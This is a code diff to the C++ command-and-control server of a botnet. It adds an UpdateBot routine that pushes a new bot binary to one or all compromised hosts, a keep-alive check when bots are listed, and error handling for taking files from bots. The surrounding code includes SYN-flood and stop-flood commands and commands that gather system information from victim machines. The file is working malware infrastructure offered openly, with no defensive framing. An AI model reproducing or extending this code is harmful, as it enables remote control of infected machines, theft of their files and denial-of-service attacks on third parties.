@@ -3,9 +3,11 @@
 #include <thread>
 #include <limits.h>
 #include <stdint.h>
+#include <stdio.h>
 #include <string.h>
 #include <fstream>
 #include <sys/stat.h>
+#include <sys/ioctl.h>
 
 #include "../defines.h"
 
@@ -171,6 +173,7 @@ void BotnetServer::BotnetCLI() {
 		ThreadSafeLogPrintAlways(this->GetCLIPrompt());
 		
 		input = ThreadSafeGetLine();
+		ThreadSafeLogPrintAlways("\n");
 
 		try {
 			command = std::stoi(input);
@@ -209,7 +212,12 @@ void BotnetServer::BotnetCLI() {
 /* Botnet commands void(void) functions */
 
 void BotnetServer::PrintBots() {
+
+	ThreadSafeLogPrintAlways(GetSepperator() + "\n");
 	ThreadSafeLogPrintAlways("Bots:\n");
+
+	// Send a keep-alive to update the bot-queue with who is connected and responsive and who is not
+	this->KeepAlive();
 
 	for (const auto bot : GetBotQueue()) {
 		// Only print if the bot is connected
@@ -217,7 +225,7 @@ void BotnetServer::PrintBots() {
 			ThreadSafeLogPrintAlways(std::string("id: ") + std::to_string(bot.GetSockId()) + std::string(" IP: ") + bot.GetIp() + "\n");
 		}
 	}
-	ThreadSafeLogPrintAlways("\n\n");
+	ThreadSafeLogPrintAlways("\n" + GetSepperator() + "\n");
 }
 
 void BotnetServer::SYNFlood() {
@@ -249,7 +257,6 @@ void BotnetServer::SYNFlood() {
 	}
 }
 
-
 void BotnetServer::StopFlood() {
 
 	static const char stop_flood_code = static_cast<const char>(Commands::STOP_FLOOD);
@@ -266,16 +273,18 @@ void BotnetServer::StopFlood() {
 	}
 }
 
-
 void BotnetServer::GetInfo() {
-
+	
 	char get_info_code = static_cast<char>(Commands::GET_INFO);
 	int bot_id;
 	std::string info;
 	static const size_t MAX_INFO_SIZE = 512;
+	
 
 	ThreadSafeLogPrintAlways("Enter bot id or '*' for all bots\n");
 	bot_id = this->ReadID();
+
+	ThreadSafeLogPrintAlways(GetSepperator() + "\n");
 
 	// Send get_info command to chosen connected bot, or all bots if bot_id == ALL_BOTS
 	for (const tcpSocket& bot : GetBotQueue()) {
@@ -293,7 +302,7 @@ void BotnetServer::GetInfo() {
 			}
 		}
 	}
-	ThreadSafeLogPrintAlways("\n");
+	ThreadSafeLogPrintAlways(GetSepperator());
 }
 
 void BotnetServer::GetFile() {
@@ -318,48 +327,135 @@ void BotnetServer::GetFile() {
 				int retv = bot.Recv(&confirmation, sizeof(char), 5);
 				// If connection closed, close and remove socket
 				if (retv == 0) {
-					ThreadSafeLogPrintAlways("Bot Logged off\n");
+					ThreadSafeLogPrintAlways("Bot Logged off\n\n");
 					RemoveBot(bot);
 				}
 
 
 				else if (retv == sizeof(char)) {
 					if (confirmation == 'Y') {
-						this->GetFileFrom(bot, file_path);
+						try {
+							this->GetFileFrom(bot, file_path);
+						}
+						catch (const std::exception& e) {
+							ThreadSafeLogPrintAlways("Error getting file\n\n");
+							return;
+						}
+						ThreadSafeLogPrintAlways("File \"" + file_path + "\" succesfully downloaded!\n\n");
 						return;
 					}
 					else {
-						ThreadSafeLogPrintAlways("File " + file_path + " does not exist\n");
+						ThreadSafeLogPrintAlways("File " + file_path + " does not exist\n\n");
 						return;
 					}
 				}
 
 				// On timeout or recv error
 				else {
-					ThreadSafeLogPrintAlways("Bot Not responsive\n");
+					ThreadSafeLogPrintAlways("Bot Not responsive\n\n");
 					return;
 				}
 			}
 		}
 	}
 
-	ThreadSafeLogPrintAlways("Bot " + std::to_string(bot_id) + " not found\n");
+	ThreadSafeLogPrintAlways("Bot " + std::to_string(bot_id) + " not found\n\n");
+}
+
+void BotnetServer::UpdateBot() {
+	char update_bot_code = static_cast<char>(Commands::UPDATE_BOT);
+
+	std::string bot_file_path;
+	int  bot_id;
+	char bot_updated = 0;
+	int  retv;
+
+	ThreadSafeLogPrintAlways("Note: file MUST be tested, if given file can't run at target bot, you will lose\n");
+	ThreadSafeLogPrintAlways("connection with it and will not be able to update it again\n");
+	ThreadSafeLogPrintAlways("Be sure to check bot's OS by using command \"Get Info\"\n");
+	ThreadSafeLogPrintAlways("Continue? [y/n] ");
+	if (tolower(getchar()) != 'y') {
+		return;
+	}
+
+	fflush(stdin);
+
+	ThreadSafeLogPrintAlways("\n");
+
+	ThreadSafeLogPrintAlways("Enter bot id or '*' for all\n");
+	bot_id = this->ReadID();
+
+	ThreadSafeLogPrintAlways("Enter path of updated bot file:\n");
+	bot_file_path = ThreadSafeGetLine();
+
+	ThreadSafeLogPrintAlways("\n");
+
+	if (access(bot_file_path.c_str(), F_OK) != 0) {
+		ThreadSafeLogPrintAlways("File " + bot_file_path + " not found\n\n");
+		return;
+	}
+
+	// Send update_bot_code command to chosen connected bot, or all bots if bot_id == ALL_BOTS
+	for (const tcpSocket& bot : GetBotQueue()) {
+		if ((bot_id == ALL_BOTS || bot_id == bot.GetSockId()) && bot.isConnected()) {
+			if (bot.Send(&update_bot_code, sizeof(char)) == sizeof(char)) {
+
+				std::ifstream updated_bot_file;
+				updated_bot_file.open(bot_file_path, std::ios::binary | std::ios::in);
+				if (updated_bot_file.bad()) {
+					ThreadSafeLogPrintAlways("Error opening file " + bot_file_path + strerror(errno) + "\n\n");
+					return;
+				}
+
+				std::string file_content((std::istreambuf_iterator<char>(updated_bot_file)),
+					                     (std::istreambuf_iterator<char>()));
+
+				ThreadSafeLogPrintAlways("Updating bot " + std::to_string(bot.GetSockId()) + "...\n");
+
+				// Send the file size
+				uint32_t file_size = file_content.size();
+				file_size = htonl(file_size);
+
+				if (bot.Send(&file_size, sizeof(file_size)) != sizeof(file_size)) {
+					ThreadSafeLogPrintAlways("Error updating bot " + std::to_string(bot.GetSockId()) + "\n\n");
+					continue;
+				}
+
+				retv = bot.Send(file_content);
+				if (retv > 0 && static_cast<size_t>(retv) != file_content.size()) {
+					ThreadSafeLogPrintAlways("Error updating bot " + std::to_string(bot.GetSockId()) + "\n\n");
+					continue;
+				}
+
+				if (bot.Recv(&bot_updated, sizeof(bot_updated), 5.0) == sizeof(bot_updated) && bot_updated == 'Y') {
+					ThreadSafeLogPrintAlways("Bot " + std::to_string(bot.GetSockId()) + " confirmed update\n\n");
+				}
+				else {
+					ThreadSafeLogPrintAlways("Bot " + std::to_string(bot.GetSockId()) + " not confirmed update, staus unknown\n\n");
+				}
+			}
+		}
+	}
+
+	ThreadSafeLogPrintAlways("Note: all updated bots will only be able to use updated features when run again\n\n");
 }
 
 /* Botnet commands helpers */
 
-
 void BotnetServer::GetFileFrom(const tcpSocket& bot, const std::string& file_path) {
+
+	// alias BOT_FILE_UPLOAD_DIR for esthetic of code
+	static const std::string upload_dir = botnet_defines::BOT_FILE_UPLOAD_DIR;
 
 	std::ofstream ofile;
 	std::string new_file_path = this->GetNewFileName(file_path);
 
-	mkdir(BOT_FILE_UPLOAD_DIR.c_str(), 0777);
+	mkdir(upload_dir.c_str(), 0777);
 
 	struct stat st = {0};
 
-	if (stat(BOT_FILE_UPLOAD_DIR.c_str(), &st) == -1) {
-		throw std::runtime_error("Error making directory " + BOT_FILE_UPLOAD_DIR + ": " + std::string(strerror(errno)));
+	if (stat(upload_dir.c_str(), &st) == -1) {
+		throw std::runtime_error("Error making directory " + upload_dir + ": " + std::string(strerror(errno)));
 	}
 
 	ofile.open(new_file_path, std::ios::binary | std::ios::out | std::ios::trunc);
@@ -409,6 +505,9 @@ void BotnetServer::GetFileFrom(const tcpSocket& bot, const std::string& file_pat
 
 std::string BotnetServer::GetNewFileName(const std::string& file_path) {
 
+	// alias BOT_FILE_UPLOAD_DIR for esthetic of code
+	static const std::string upload_dir = botnet_defines::BOT_FILE_UPLOAD_DIR;
+
 	std::string file_name;
 	std::string new_file_path;
 
@@ -420,13 +519,13 @@ std::string BotnetServer::GetNewFileName(const std::string& file_path) {
 		file_name = file_path;
 	}
 
-	if (access((BOT_FILE_UPLOAD_DIR + "/" + file_name).c_str(), F_OK) != 0) {
-		new_file_path = BOT_FILE_UPLOAD_DIR + "/" + file_name;
+	if (access((upload_dir + "/" + file_name).c_str(), F_OK) != 0) {
+		new_file_path = upload_dir + "/" + file_name;
 	}
 	else {
 		for (int i = 0; i < 256; i++) {
-			if (access((BOT_FILE_UPLOAD_DIR + "/" + file_name + "(" + std::to_string(i) + ")").c_str(), F_OK) != 0) {
-				new_file_path = BOT_FILE_UPLOAD_DIR + "/" + file_name + "(" + std::to_string(i) + ")";
+			if (access((upload_dir + "/" + file_name + "(" + std::to_string(i) + ")").c_str(), F_OK) != 0) {
+				new_file_path = upload_dir + "/" + file_name + "(" + std::to_string(i) + ")";
 				break;
 			}
 		}
@@ -544,4 +643,25 @@ uint16_t BotnetServer::ReadPort() {
 std::deque<tcpSocket> BotnetServer::GetBotQueue() {
 	std::lock_guard<std::mutex> master_set_lg(master_set_lock);
 	return master_set.GetAllSockets();
+}
+
+std::string BotnetServer::GetSepperator() const {
+	// Get terminal width
+	struct winsize terminal_size;
+	ioctl(STDOUT_FILENO, TIOCGWINSZ, &terminal_size);
+
+	int terminal_width = terminal_size.ws_col;
+
+	// Don't print more then terminal width (-2 for the '<' and '>')
+	size_t dash_times = terminal_width > 17 ? 15 : terminal_width - 2;
+	
+	std::string Sepperator;
+
+	Sepperator += "<";
+	for (size_t i = 0; i < dash_times; i++) {
+		Sepperator += "-";
+	}
+	Sepperator += ">\n";
+
+	return Sepperator;
 }
